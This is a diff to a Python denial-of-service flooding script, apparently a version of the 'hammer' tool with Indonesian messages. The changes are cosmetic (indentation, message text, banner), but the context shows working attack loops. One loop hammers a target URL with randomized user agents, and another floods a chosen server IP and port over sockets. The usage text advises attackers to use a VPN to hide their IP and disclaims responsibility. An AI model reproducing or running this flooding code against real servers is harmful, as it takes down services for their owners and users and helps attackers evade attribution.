@@ -20,7 +20,7 @@ def user_agent():
 	uagent.append("Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
 	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
 	uagent.append("Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1")
-        return(uagent)
+	return(uagent)
 
 
 def my_bots():
@@ -35,7 +35,7 @@ def bot_hammering(url):
 	try:
 		while True:
 			req = urllib.request.urlopen(urllib.request.Request(url,headers={'User-Agent': random.choice(uagent)}))
-			print("\033[94mBot Lagi Menyerang...\033[0m")
+			print("\033[94mbBot Lagi Menyerang...\033[0m")
 			time.sleep(.1)
 	except:
 		time.sleep(.1)
@@ -49,13 +49,13 @@ def down_it(item):
 			s.connect((host,int(port)))
 			if s.sendto( packet, (host, int(port)) ):
 				s.shutdown(1)
-				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Attacking!!--> \033[0m")
+				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--Attacking!--> \033[0m")
 			else:
 				s.shutdown(1)
 				print("\033[91mshut<->down\033[0m")
 			time.sleep(.1)
 	except socket.error as e:
-		print("\033[91mDos Berhasil! Server Sudah Down\033[0m")
+		print("\033[91mDDos Berhasil!Server Sudah Down\033[0m")
 		#print("\033[91m",e,"\033[0m")
 		time.sleep(.1)
 
@@ -76,20 +76,21 @@ def dos2():
 
 def usage():
 	print (''' \033[92m	
-                                 _
-           / \   _ __   __ _    | | __ _
-          / _ \ | '_ \ / _` |_  | |/ _` |
-         / ___ \| |_) | (_| | |_| | (_| |
-        /_/   \_\ .__/ \__,_|\___/ \__,_|
-                |_|
-        ApaJa Dos Script 
-	IPmu keliatan Jadi Aku Sarankan Menggunakan VPN 
-        usage : python3 DDos.py [-s] [-p] [-t]
-	-h : help
-	-s : server ip
-	-p : port default 80
-	-t : turbo default 135 \033[0m''')
-	sys.exit()
+                         _
+   / \   _ __   __ _    | | __ _
+  / _ \ | '_ \ / _` |_  | |/ _` |
+ / ___ \| |_) | (_| | |_| | (_| |
+/_/   \_\ .__/ \__,_|\___/ \__,_|
+        |_|
+DDos Script v.1 
+Pembuat Tidak Bertanggung Jawab!
+Ipmu Terlihat Aku Sarankan Pake VPN.
+usage : python3 hammer.py [-s] [-p] [-t]
+-h : help
+-s : server ip
+-p : port default 80
+-t : turbo default 135 \033[0m''')
+sys.exit()
 
 
 def get_parameters():
@@ -97,7 +98,7 @@ def get_parameters():
 	global port
 	global thr
 	global item
-	optp = OptionParser(add_help_option=False,epilog="MAMPUS DDOS BY MR.JA")
+	optp = OptionParser(add_help_option=False,epilog="Mampus DDos By Mr.Ja")
 	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
 	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
 	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
